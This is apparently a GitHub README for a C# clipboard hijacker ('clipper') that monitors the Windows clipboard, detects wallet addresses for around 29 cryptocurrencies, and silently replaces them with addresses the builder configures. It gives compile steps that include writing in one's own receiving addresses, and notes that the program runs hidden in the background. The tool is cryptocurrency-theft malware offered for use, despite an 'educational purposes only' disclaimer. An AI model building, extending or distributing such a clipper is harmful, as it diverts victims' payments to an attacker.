# Clipboard Crypto Address Replacer
This project is a C# application that replaces cryptocurrency wallet addresses copied to the clipboard with predefined addresses. The application detects wallet addresses using regex patterns for different cryptocurrencies and replaces them using RSA encryption.  

## Features
- **Clipboard Monitoring:** Continuously checks clipboard content.  
- **Crypto Wallet Address Detection:** Uses regex patterns to detect supported cryptocurrency addresses.  
- **RSA Encryption & Decryption:** Encrypts addresses and replaces them as needed.  
- **Mutual Exclusion (Mutex) Usage:** Ensures only one instance runs at a time.  
- **Secure Address Management:** Predefined addresses are stored using RSA encryption.  

## Supported Cryptocurrencies
This application can detect the addresses of the following cryptocurrencies:  
- Bitcoin (BTC)  
- Litecoin (LTC)  
- Ethereum (ETH)  
- Monero (XMR)  
- Ripple (XRP)  
- NEO (NEO)  
- Bitcoin Cash (BCH)  
- Dogecoin (DOGE)  
- Dash (DASH)  
- Stellar (XLM)  
- Binance Beacon (BNB) (Removed) 
- Tezos (XTZ)  
- Tron (TRX)  
- VeChain (VET)  
- Nano (NANO)  
- DigiByte (DGB)  
- Qtum (QTUM)  
- NEM (XEM)  
- Waves (WAVES)  
- Zcash (ZEC)  
- Cardano (ADA)  
- Polkadot (DOT)  
- Cosmos (ATOM)  
- Lisk (LSK)  
- Kava (KAVA)  
- Algorand (ALGO)  
- Filecoin (FIL)  
- Terra (LUNA)  
- Thorchain (RUNE)  

## Usage  

### Requirements  
- Visual Studio 2022
- .NET Framework must be installed.  
- Windows operating system is required (uses Clipboard API).

### Compilation
- Download the project to your computer
- Extract the project to a Folder.
- Open Solution File
- Write your own addresses where `*_ADDRESS` is written. If not present, leave blank
- Select **Build Solution** from the **Build** menu.

### Execution

- Compiled File Location: `.\bin\Debug\Clipper.exe`
- When you run the file, it runs silently in the background.

https://github.com/user-attachments/assets/e55ef5f5-71f5-45fe-bb74-9afebea2fd10

## Contributing  

**⭐ Star this repository if you find it useful!**

## Disclaimer

This project is for **educational and research purposes only**. Malicious or unethical use is strictly discouraged. Users should assess their own risks before executing this code.

## License  
This project is open-source and licensed under the MIT License.  